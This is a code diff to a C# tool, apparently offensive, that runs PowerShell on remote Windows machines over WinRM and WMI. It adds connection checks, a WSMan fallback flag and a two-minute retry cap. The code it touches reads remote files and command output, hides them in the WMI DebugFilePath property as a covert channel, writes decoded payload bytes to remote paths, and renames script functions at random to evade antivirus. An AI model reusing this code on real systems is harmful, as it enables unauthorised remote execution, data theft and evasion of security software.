@@ -329,15 +329,20 @@ namespace Execute
                         return null;
                     }
 
-                    string command1 = "$data = (Get-Content " + path + " | Out-String).Trim()";
-                    const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
-                    const string command3 =
-                        @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+                    if (powershell.Runspace.ConnectionInfo != null)
+                    {
+                        string command1 = "$data = (Get-Content " + path + " | Out-String).Trim()";
+                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
+                        const string command3 =
+                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
 
-                    powershell.Commands.AddScript(command1, false);
-                    powershell.Commands.AddScript(command2, false);
-                    powershell.Commands.AddScript(command3, false);
-                    Collection<PSObject> result = powershell.Invoke();
+                        powershell.Commands.AddScript(command1, false);
+                        powershell.Commands.AddScript(command2, false);
+                        powershell.Commands.AddScript(command3, false);
+                        Collection<PSObject> result = powershell.Invoke();
+                    }
+                    else
+                        wsman = false;
                 }
             }
 
@@ -481,11 +486,15 @@ namespace Execute
                             powershell.Commands.AddScript(setEnv, false);
                         }
 
-                        powershell.Commands.AddScript(command1, false);
-                        powershell.Commands.AddScript(command2, false);
-                        powershell.Commands.AddScript(command3, false);
-                        powershell.Invoke();
-
+                        if (powershell.Runspace.ConnectionInfo != null)
+                        {
+                            powershell.Commands.AddScript(command1, false);
+                            powershell.Commands.AddScript(command2, false);
+                            powershell.Commands.AddScript(command3, false);
+                            powershell.Invoke();
+                        }
+                        else
+                            wsman = false;
                     }
                     catch (PSRemotingTransportException)
                     {
@@ -754,11 +763,15 @@ namespace Execute
                             @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                             writePath + "' -Value $decoded";
 
-                        powershell.Commands.AddScript(command1, false);
-                        powershell.Commands.AddScript(command2, false);
-                        powershell.Commands.AddScript(command3, false);
-                        powershell.Invoke();
-
+                        if (powershell.Runspace.ConnectionInfo != null)
+                        {
+                            powershell.Commands.AddScript(command1, false);
+                            powershell.Commands.AddScript(command2, false);
+                            powershell.Commands.AddScript(command3, false);
+                            powershell.Invoke();
+                        }
+                        else
+                            wsman = false;
                     }
                     catch (PSRemotingTransportException)
                     {
@@ -832,7 +845,7 @@ namespace Execute
                 {
                     try
                     {
-                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
+                        if (!string.IsNullOrEmpty(planter.System?.ToString()))
                             powershell.Runspace = RunspaceCreate(planter);
                         else
                         {
@@ -857,46 +870,51 @@ namespace Execute
                         Console.WriteLine(e);
                     }
 
-                    string command1 = "$data = (" + command + " | Out-String).Trim()";
-                    const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
-                    const string command3 =
-                        @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-
-                    powershell.Commands.AddScript(command1, false);
-                    powershell.Commands.AddScript(command2, false);
-                    powershell.Commands.AddScript(command3, false);
-
-                    // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
-                    if (noDebugCheck)
+                    if (powershell.Runspace.ConnectionInfo != null)
                     {
-                        // start the timer and get a timeout
-                        DateTime startTime = DateTime.Now;
-                        IAsyncResult asyncPs = powershell.BeginInvoke();
+                        string command1 = "$data = (" + command + " | Out-String).Trim()";
+                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
+                        const string command3 =
+                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
 
-                        while (asyncPs.IsCompleted == false)
+                        powershell.Commands.AddScript(command1, false);
+                        powershell.Commands.AddScript(command2, false);
+                        powershell.Commands.AddScript(command3, false);
+
+                        // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
+                        if (noDebugCheck)
                         {
-                            //Console.WriteLine("Waiting for pipeline to finish...");
-                            Thread.Sleep(5000);
+                            // start the timer and get a timeout
+                            DateTime startTime = DateTime.Now;
+                            IAsyncResult asyncPs = powershell.BeginInvoke();
 
-                            // Check on our timeout here
-                            TimeSpan elasped = DateTime.Now.Subtract(startTime);
-                            if (elasped > timeout)
-                                break;
+                            while (asyncPs.IsCompleted == false)
+                            {
+                                //Console.WriteLine("Waiting for pipeline to finish...");
+                                Thread.Sleep(5000);
+
+                                // Check on our timeout here
+                                TimeSpan elasped = DateTime.Now.Subtract(startTime);
+                                if (elasped > timeout)
+                                    break;
+                            }
+
+                            //powershell.EndInvoke(asyncPs);
                         }
-
-                        //powershell.EndInvoke(asyncPs);
+                        else
+                        {
+                            powershell.Invoke();
+                        }
                     }
                     else
-                    {
-                        powershell.Invoke();
-                    }
+                        wsman = false;
                 }
             }
 
             GetOut:
             if (wsman == false)
             {
-                if (string.IsNullOrEmpty(planter.Password?.ToString()))
+                if (string.IsNullOrEmpty(planter.System?.ToString()))
                 {
                     try
                     {
@@ -1335,29 +1353,33 @@ namespace Execute
                     script = Regex.Replace(script, @"\bcalldllmainsc2\b", RandomString(10), RegexOptions.IgnoreCase);
                     script = Regex.Replace(script, @"\bcalldllmainsc3\b", RandomString(10), RegexOptions.IgnoreCase);
 
-
-                    // This all works right now but if we see issues down the line with output we may need to throw the output in DebugFilePath property
-                    // Will want to add in some obfuscation
-                    powerShell.AddScript(script).AddScript("Invoke-Expression ; " + functionToRun);
-                    Collection<PSObject> results;
-                    try
+                    if (powerShell.Runspace.ConnectionInfo != null)
                     {
-                        results = powerShell?.Invoke();
-                    }
-                    catch (RemoteException e)
-                    {
-                        Messenger.ErrorMessage("[-] Error: Issues with PowerShell script, it may have been flagged by AV");
-                        Console.WriteLine(e);
-                        throw new CaughtByAvException(e.Message);
-                    }
-
-                    if (results != null)
-                        foreach (PSObject result in results)
+                        // This all works right now but if we see issues down the line with output we may need to throw the output in DebugFilePath property
+                        // Will want to add in some obfuscation
+                        powerShell.AddScript(script).AddScript("Invoke-Expression ; " + functionToRun);
+                        Collection<PSObject> results;
+                        try
                         {
-                            Console.WriteLine(result);
+                            results = powerShell?.Invoke();
+                        }
+                        catch (RemoteException e)
+                        {
+                            Messenger.ErrorMessage("[-] Error: Issues with PowerShell script, it may have been flagged by AV");
+                            Console.WriteLine(e);
+                            throw new CaughtByAvException(e.Message);
                         }
 
-                    return true;
+                        if (results != null)
+                            foreach (PSObject result in results)
+                            {
+                                Console.WriteLine(result);
+                            }
+
+                        return true;
+                    }
+                    else
+                        wsman = false;
                 }
             }
 
@@ -2293,6 +2315,7 @@ namespace Execute
             bool warn = false;
             string returnRecovery = null;
             bool breakLoop = false;
+            int counter = 0;
 
             do
             {
@@ -2300,8 +2323,14 @@ namespace Execute
                 if (modifiedRecovery == originalWmiProperty)
                 {
                     Messenger.WarningMessage("DebugFilePath write not completed, sleeping for 10s...");
-                    System.Threading.Thread.Sleep(10000);
+                    Thread.Sleep(10000);
                     warn = true;
+                    counter++;
+                    if (counter > 12)
+                    {
+                        // We only want to run for 2 mins max
+                        breakLoop = true;
+                    }
                 }
                 else
                 {
